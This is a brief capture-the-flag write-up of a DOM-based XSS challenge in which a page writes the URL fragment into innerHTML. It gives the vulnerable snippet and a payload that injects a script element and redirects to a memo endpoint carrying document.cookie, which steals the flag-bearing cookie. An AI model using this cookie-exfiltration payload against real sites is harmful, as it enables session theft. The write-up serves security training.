# XSS - DOM

At first, we can see that there is an serious xss vuln in the /vuln page

```
<script nonce={{ nonce }}>
    window.addEventListener("load", function() {
      var name_elem = document.getElementById("name");
      name_elem.innerHTML = `${location.hash.slice(1)} is my name !`;
    });
 </script>
```

You can create a script with an id "name" and insert a code after the tag. The malicious code will automatically execute

```
<script id="name">
alert(123);
</script>
```

So we only need to inject this payload to get the cookie that contain the flag

Before the #: <script id= "name"></script>
After the #: document.location.href="/memo?memo="+document.cookie

You can find the flag on your own
